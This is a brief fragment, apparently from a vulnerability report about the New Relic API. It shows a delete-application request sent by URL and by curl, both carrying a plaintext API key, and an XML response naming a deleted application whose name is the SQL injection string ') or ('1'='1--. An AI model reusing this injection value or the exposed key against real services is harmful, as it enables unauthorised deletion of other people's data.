...
https://api.newrelic.com/api/v1/accounts/26286/applications/delete.xml?app_id[]=11068&data_access_key=a4a249e3f3b437002efb6121844e0a4ee1d00942b18cfb9
...
curl -H "x-api-key:a4a249e3f3b437002efb6121844e0a4ee1d00942b18cfb9" 'https://staging.newrelic.com/api/v1/accounts/26286/applications/delete.xml?app_id=11253'

Actual response:

    <?xml version="1.0" encoding="UTF-8"?>
        <applications type="array">
            <application name="') or ('1'='1--" id="11253">
                <result>deleted</result>
            </application>
    </applications>
